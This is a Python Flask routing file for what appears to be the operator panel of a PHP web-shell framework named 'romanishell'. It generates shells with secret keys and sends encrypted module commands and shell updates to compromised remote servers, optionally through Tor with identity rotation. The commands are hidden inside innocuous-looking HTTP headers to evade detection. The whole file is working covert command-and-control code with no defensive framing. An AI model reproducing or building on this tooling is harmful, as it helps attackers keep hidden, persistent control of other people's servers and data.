# router.py

from . import (
    fm,
    config,
    totoro,
    serverctl,
    shcrypt,
    romanicomposer
)

from flask import (
    send_file,
    jsonify,
    request,
    abort
)

import time
import json

def _extract_request_shit(req):
    """Extracts elements from the request."""
    params = dict(req.args)
    data = dict(req.form)
    jsondata = dict(req.get_json()) if req.is_json else None
    files = dict(req.files)
    headers = dict(req.headers)
    cookies = dict(req.cookies)

    return params, data, jsondata, files, headers, cookies

def _upload_romanishell():
    pass

def define_routes(app):
    """Defines all the routes of this API."""

    @app.route('/')
    def hello_world():
        """Index : serves index.html"""
        return send_file('app/static/index.html')

    # Static files
    # => already served as static/* from app/static/

    @app.route('/module/<string:name>.js')
    def get_module_js(name):
        """Returns the JS content of the module's Vue Component."""
        return send_file('modules/{}/module.vue.js'.format(name))

    @app.route('/api', methods=['POST'])
    def local_api_call():
        """Local API Call. Used by the webpage to request information that is
        not provided by the remote server, but this Flask app."""
        __, __, jsondata, __, __, __ = _extract_request_shit(request)

        info = jsondata.get('info')
        data = jsondata.get('data')

        if info == 'modules':
            return jsonify(fm.readjson('app/data/modules.json'))

        elif info == 'servers':
            return jsonify(fm.readjson('app/data/servers.json'))

        elif info == 'status':
            toro = totoro()
            status = {
                "vpn_status": toro.vpn_status(),
                "tor_status": toro.status(),
                "ipgeoloc": toro.ipinfo()
            }
            return jsonify(status)

        elif info == 'newnym':
            totoro().change_identity()
            return jsonify({"ok":True})

        elif info == 'getnote':
            noteData = fm.readjson('app/data/notes.json')
            servid = data['servid']

            noteContent = noteData[servid] if servid in noteData else ""

            return jsonify({"content":noteContent})

        elif info == 'savenote':
            noteData = fm.readjson('app/data/notes.json')
            servid = data['servid']
            content = data['content']

            noteData[servid] = content
            fm.writejson('app/data/notes.json', noteData)
            return jsonify({"ok":True})

        elif info == 'genshell':
            key = data['key']
            servid = data['servid']
            modules = data['modules']
            serverinfo = serverctl.get(servid)

            if key == 'new':
                secretkey = shcrypt.generate_secret_key()
            else:
                secretkey = serverinfo['secretkey']

            ok, genedfile = romanicomposer.compose(secretkey, modules, servid)
            if ok:
                return jsonify({"shell":genedfile, "secretkey":secretkey})
            else:
                return abort(500)

        return abort(404)

    @app.route('/remote/api', methods=['POST'])
    def remote_api_forward():
        """Remote API Call. Used by the webpage to request information provided
        by the remote server.
        We use Tor if decided in the config file.
        The first request to the server must be "healthstatus", in order to get
        the remote timestamp. This is used in future requests to protect them
        from replay attacks (the request lifetime is only 2-3 seconds).
        """
        __, __, jsondata, __, __, __ = _extract_request_shit(request)

        if not request.is_json:
            return abort(400)

        # Get parameters
        server = jsondata.get('server')
        module = jsondata.get('module')
        data = jsondata.get('data')

        if server is None or module is None:
            return abort(404)

        # Get Totoro
        toro = totoro()

        # Retrieve server info
        serverinfo = serverctl.get(server)
        secretkey = serverinfo['secretkey']

        # Set auth cookie
        authcookie = serverinfo['domain'] + '|'
        if module != 'core' or data.get('handler') != 'healthstatus':
            timediff = serverctl.get_time_diff(server)

            if timediff is None:
                return abort(500)

            timestamp = int(time.time())
            remote_timestamp = timestamp + timediff

            authcookie += str(remote_timestamp)

        # Set headers
        headers = {
            'WWW-AUTHENTICATE': shcrypt.encrypt('0|' + authcookie, secretkey),
            'X-ROBOTS-TAG': shcrypt.encrypt('1|' + module, secretkey),
            'X-CONTENT-TYPE-OPTIONS': shcrypt.encrypt(
                '2|' + json.dumps(data),
                secretkey
            )
        }

        # Is it a romanishell update?
        datareq = None
        genedfile = 'romanishell/generated/' + server + '.php'
        is_update = (module == 'core'
                     and data.get('handler') == 'update'
                     and 'secretkey' in data.get('data')
                     and fm.exists(genedfile))
        if is_update:
            #headers['Content-Type'] = 'text/plain'
            datareq = shcrypt.encrypt(fm.read(genedfile), secretkey)

        # Send request
        meth = 'torreq' if config('use_tor') else 'dirreq'
        __, r = getattr(toro, meth)(
            'GET', serverinfo['url'], headers=headers, data=datareq
        )
        respcontent = shcrypt.decrypt(r.text, secretkey)

        # Save time difference for later requests
        if (module == 'core'
                and data.get('handler') == 'healthstatus'
                and r.status_code == 418):
            timestamp = int(time.time())
            remote_timestamp = int(json.loads(respcontent)['time'])
            timediff = remote_timestamp - timestamp
            serverctl.set_time_diff(server, timediff)

        # Update the secretkey if needed
        if (is_update
                and data.get('data').get('secretkey') != secretkey
                and r.status_code == 200
                and json.loads(respcontent)['success'] != False):
            serverctl.set_secret_key(server, data.get('data').get('secretkey'))

        if respcontent is None:
            respcontent = ""

        return respcontent, r.status_code
